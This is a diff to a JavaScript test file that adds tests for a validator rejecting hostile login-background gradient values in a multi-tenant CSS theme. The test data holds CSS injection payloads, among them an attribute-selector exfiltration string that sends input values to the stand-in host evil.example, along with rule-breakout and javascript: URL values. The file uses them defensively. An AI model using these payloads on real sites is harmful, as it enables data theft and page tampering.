@@ -23,6 +23,7 @@ import {
   clearSSRThemeCache,
   fetchPublishedThemeFromGateway,
   getPublishedTenantTheme,
+  isSafeGradient,
   PUBLISHED_THEME_PATH,
   renderTenantThemeCSS,
   resolveRequestTenantSlug,
@@ -127,6 +128,64 @@ describe('brandToTenantTokens — Brand → --tenant-* token strings', () => {
     };
     const tokens = brandToTenantTokens(hostile);
     expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  // PRC-M616 / PRC-L409: the gradient is emitted raw into :root{…}, so it must
+  // not be able to close the declaration/rule or pull in a resource.
+  const RULE_INJECTION =
+    'linear-gradient(red,blue);} body{display:none} :root{--x:linear-gradient(a)';
+  it.each([
+    ['rule injection via ;}', RULE_INJECTION],
+    [
+      'attribute-selector exfiltration',
+      'linear-gradient(red,blue);} input[value^=a]{background:url(https://evil.example/a)} :root{--x:linear-gradient(red,blue)',
+    ],
+    ['nested url(', 'linear-gradient(red, url(https://evil.example/a))'],
+    ['uppercase URL(', 'linear-gradient(red, URL(https://evil.example/a))'],
+    ['semicolon only', 'linear-gradient(red, blue); color: red'],
+    ['brace only', 'linear-gradient(red, blue)}'],
+    ['backslash escape', 'linear-gradient(red, \\75 rl(x))'],
+    ['comment', 'linear-gradient(red /* x */, blue)'],
+    ['at-rule', 'linear-gradient(red, blue) @import x'],
+    ['angle bracket', 'linear-gradient(red, blue)</style>'],
+    ['double quote', 'linear-gradient(red, "blue")'],
+    ['single quote', "linear-gradient(red, 'blue')"],
+    ['newline', 'linear-gradient(red,\nblue)'],
+    ['unbalanced open', 'linear-gradient(red, hsl(1, 2%, 3%)'],
+    ['unbalanced close', 'linear-gradient(red, blue))'],
+    ['trailing content after close', 'linear-gradient(red) , radial-gradient(blue)'],
+  ])('rejects a login background gradient with %s', (_label, value) => {
+    expect(isSafeGradient(value)).toBe(false);
+    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
+    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  it('keeps injected rules out of the rendered :root block', () => {
+    const css = renderTenantThemeCSS(
+      brandToTenantTokens({ ...SAMPLE_BRAND, login_background: RULE_INJECTION }),
+    );
+    expect(css).not.toContain('display:none');
+    expect(css).not.toContain('body{');
+  });
+
+  it.each([
+    'url(https://evil.example/a);} body{display:none}',
+    'url(https://evil.example/a) red',
+    'url(javascript:alert(1))',
+  ])('rejects a hostile top-level url( login background %#', (value) => {
+    const tokens = brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value });
+    expect(tokens.loginBackground).toBe(DEFAULT_BRAND.login_background);
+  });
+
+  it.each([
+    'linear-gradient(135deg, hsl(280, 70%, 30%), hsl(280, 70%, 50%))',
+    'radial-gradient(circle at 50% 50%, #fff 0%, #000 100%)',
+    'linear-gradient(to right, rgba(0, 0, 0, 0.5), hsl(222 47% 11% / 0.8))',
+  ])('accepts a well-formed gradient %#', (value) => {
+    expect(isSafeGradient(value)).toBe(true);
+    expect(brandToTenantTokens({ ...SAMPLE_BRAND, login_background: value }).loginBackground).toBe(
+      value,
+    );
   });
 });
 
